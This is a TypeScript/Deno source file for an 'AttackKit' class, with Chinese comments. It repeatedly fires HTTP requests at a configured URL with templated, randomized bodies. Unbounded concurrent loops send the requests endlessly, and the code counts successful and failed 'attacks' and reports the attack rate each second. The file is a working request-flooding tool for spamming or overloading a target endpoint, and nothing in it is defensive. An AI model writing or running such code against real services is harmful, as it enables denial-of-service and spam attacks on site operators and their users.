import LoggerKit from "./LoggerKit.ts"
import ConfigKit from "./ConfigKit.ts"
import VariableKit from "./VariableKit.ts"

const logger = new LoggerKit("AttackKit")

export default class AttackKit {
    // 攻击统计项目
    private static totalAttacks = 0
    private static successfulAttacks = 0
    private static failedAttacks = 0
    private static lastSecondAttacks = 0
    private static attackSpeed = 0
    private static intervalId: number | null = null
    
    static async attack() {
        try {
            const config = ConfigKit.getConfig()
            const feature = config.feature

            let body = feature.body
            if (typeof body === "object") {
                const replacedBody: Record<string, any> = {}
                for (const [key, value] of Object.entries(body)) {
                    replacedBody[key] = typeof value === "string" 
                        ? VariableKit.replace(value) 
                        : value
                }
                body = replacedBody
            } else if (typeof body === "string") {
                body = VariableKit.replace(body)
            }

            const response = await fetch(feature.url, {
                method: feature.method,
                headers: feature.headers,
                body: JSON.stringify(body),
            })

            this.totalAttacks++
            if (response.ok) {
                this.successfulAttacks++
            } else {
                this.failedAttacks++
            }
            
            return {
                status: response.status,
                data: await response.json(),
            }
        } catch (err) {
            this.totalAttacks++
            this.failedAttacks++
            logger.error("攻击失败:", String(err))
            throw err
        }
    }
    
    // 开始攻击
    static async startContinuousAttack() {
        logger.info("开始攻击...")
        
        // 停止已有攻击
        this.stopContinuousAttack()
        
        const config = ConfigKit.getConfig()
        const concurrent = config.concurrent || 1
        
        // 每秒更新攻击速度
        this.intervalId = setInterval(() => {
            this.attackSpeed = this.totalAttacks - this.lastSecondAttacks
            this.lastSecondAttacks = this.totalAttacks
            this.displayStats()
        }, 1000)
        
        // 启动并发攻击
        for (let i = 0; i < concurrent; i++) {
            this.runAttackLoop()
        }
    }
    
    // 攻击循环（持续发起攻击）
    private static async runAttackLoop() {
        while (true) {
            try {
                await this.attack()
            } catch (err) {
                // 错误已捕获，无需重复捕获，继续攻击
            }
        }
    }
    
    // 停止攻击
    static stopContinuousAttack() {
        if (this.intervalId) {
            clearInterval(this.intervalId)
            this.intervalId = null
        }
    }
    
    // 显示攻击统计
    private static displayStats() {
        const stats = `\r攻击统计: 总次数 ${this.totalAttacks} | ` +
                     `成功 ${this.successfulAttacks} | ` +
                     `失败 ${this.failedAttacks} | ` +
                     `速度 ${this.attackSpeed} 次/秒`
        
        // 单行更新
        Deno.stdout.write(new TextEncoder().encode(stats))
    }
}